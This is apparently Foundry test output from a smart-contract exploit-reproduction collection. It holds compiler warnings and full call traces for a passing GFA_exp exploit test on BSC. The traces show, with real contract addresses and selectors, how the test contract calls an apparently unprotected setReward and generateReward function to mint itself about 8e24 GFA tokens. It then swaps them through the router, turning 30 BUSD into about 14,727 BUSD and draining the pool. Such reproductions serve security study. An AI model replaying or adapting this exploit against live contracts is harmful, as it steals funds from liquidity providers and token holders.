Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.36s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-04/GFA_exp.sol:40:13:
   |
40 |             Reward.call(abi.encodeWithSelector(bytes4(0x5f7938f1), address(this),400000000 * 1e18,40000000 *1e18,12222));
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-04/GFA_exp.sol:41:13:
   |
41 |             Reward.call(abi.encodeWithSelector(bytes4(0x3890ec92), 100));
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 312.47ms (186.82µs CPU time)

Ran 1 test for src/test/2024-04/GFA_exp.sol:Exploit
[PASS] testExploit() (gas: 701315)
Logs:
  attacker balance BUSD before attack:: 30.000000000000000000
  attacker balance BUSD after attack:: 14727.536063502076013262

Traces:
  [833915] Exploit::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 30000000000000000000 [3e19]
    ├─ [2425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "attacker balance BUSD before attack:", val: 30000000000000000000 [3e19], decimals: 18)
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [2562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 30000000000000000000 [3e19])
    │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 30000000000000000000 [3e19])
    │   └─ ← [Return] true
    ├─ [144297] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(30000000000000000000 [3e19], 0, [0x55d398326f99059fF775485246999027B3197955, 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1713113405 [1.713e9])
    │   ├─ [13634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, 30000000000000000000 [3e19])
    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, value: 30000000000000000000 [3e19])
    │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [2908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2893] 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F::getReserves() [staticcall]
    │   │   └─ ← [Return] 1177708227762213133487581 [1.177e24], 16931531933982254595247 [1.693e22], 1713113093 [1.713e9]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   └─ ← [Return] 16961531933982254595247 [1.696e22]
    │   ├─ [111231] 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F::swap(2077823789133060321795 [2.077e21], 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [76480] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2077823789133060321795 [2.077e21])
    │   │   │   ├─ emit Transfer(from: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2015489075459068512142 [2.015e21])
    │   │   │   ├─ emit Transfer(from: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, to: 0x78f5d8fd3232beb9b491e81B1cC53cFe000f66eE, value: 62334713673991809653 [6.233e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   └─ ← [Return] 1175630403973080073165786 [1.175e24]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   └─ ← [Return] 16961531933982254595247 [1.696e22]
    │   │   ├─ emit Sync(reserve0: 1175630403973080073165786 [1.175e24], reserve1: 16961531933982254595247 [1.696e22])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 30000000000000000000 [3e19], amount0Out: 2077823789133060321795 [2.077e21], amount1Out: 0, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 2015489075459068512142 [2.015e21]
    │   └─ ← [Stop] 
    ├─ [200998] 0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE::setReward(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000000 [4e26], 40000000000000000000000000 [4e25], 12222 [1.222e4])
    │   └─ ← [Stop] 
    ├─ [218850] 0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE::generateReward(100)
    │   ├─  emit topic 0: 0x042a4e062dcfeb517a668f8ad320e95b7275cef0f3ec89343dad0d2460f873f0
    │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000002116545850052128000000000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000236261d10e0c8d1da00000000000000000000000000000000000000000000000001fc3842bd1f071c000000
    │   └─ ← [Stop] 
    ├─ [52368] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::transfer(0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD, 10000 [1e4])
    │   ├─ [885] 0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE::7f1b60c1(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000002116545850052128000000
    │   ├─ [1495] 0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE::7c6531e1(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000002116545850052128000000
    │   ├─ emit Transfer(from: 0xE83d8a3C45b77d95C850C00aca53A57cE9D49314, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8000000000000000000000000 [8e24])
    │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD, value: 10000 [1e4])
    │   └─ ← [Return] true
    ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 8002015489075459068502142 [8.002e24]
    ├─ [25289] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 8002015489075459068502142 [8.002e24])
    │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 8002015489075459068502142 [8.002e24])
    │   └─ ← [Return] true
    ├─ [100777] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(8002015489075459068502142 [8.002e24], 0, [0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD, 0x55d398326f99059fF775485246999027B3197955], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1713113405 [1.713e9])
    │   ├─ [72034] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, 8002015489075459068502142 [8.002e24])
    │   │   ├─ emit Transfer(from: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, to: 0x000000000000000000000000000000000000dEaD, value: 1175630403973080073165 [1.175e21])
    │   │   ├─ [9351] 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F::sync()
    │   │   │   ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   │   └─ ← [Return] 1174454773569106993092621 [1.174e24]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   │   └─ ← [Return] 16961531933982254595247 [1.696e22]
    │   │   │   ├─ emit Sync(reserve0: 1174454773569106993092621 [1.174e24], reserve1: 16961531933982254595247 [1.696e22])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit AutoNukeLP()
    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, value: 7761955024403195296447078 [7.761e24])
    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x78f5d8fd3232beb9b491e81B1cC53cFe000f66eE, value: 240060464672263772055064 [2.4e23])
    │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [893] 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F::getReserves() [staticcall]
    │   │   └─ ← [Return] 1174454773569106993092621 [1.174e24], 16961531933982254595247 [1.696e22], 1713113405 [1.713e9]
    │   ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   └─ ← [Return] 8936409797972302289539699 [8.936e24]
    │   ├─ [18738] 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F::swap(0, 14727536063502076013262 [1.472e22], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14727536063502076013262 [1.472e22])
    │   │   │   ├─ emit Transfer(from: 0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14727536063502076013262 [1.472e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [908] 0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   └─ ← [Return] 8936409797972302289539699 [8.936e24]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F) [staticcall]
    │   │   │   └─ ← [Return] 2233995870480178581985 [2.233e21]
    │   │   ├─ emit Sync(reserve0: 8936409797972302289539699 [8.936e24], reserve1: 2233995870480178581985 [2.233e21])
    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 7761955024403195296447078 [7.761e24], amount1In: 0, amount0Out: 0, amount1Out: 14727536063502076013262 [1.472e22], to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 14727536063502076013262 [1.472e22]
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 14727536063502076013262 [1.472e22]
    ├─ [425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "attacker balance BUSD after attack:", val: 14727536063502076013262 [1.472e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.09s (6.26s CPU time)

Ran 2 test suites in 7.47s (7.40s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
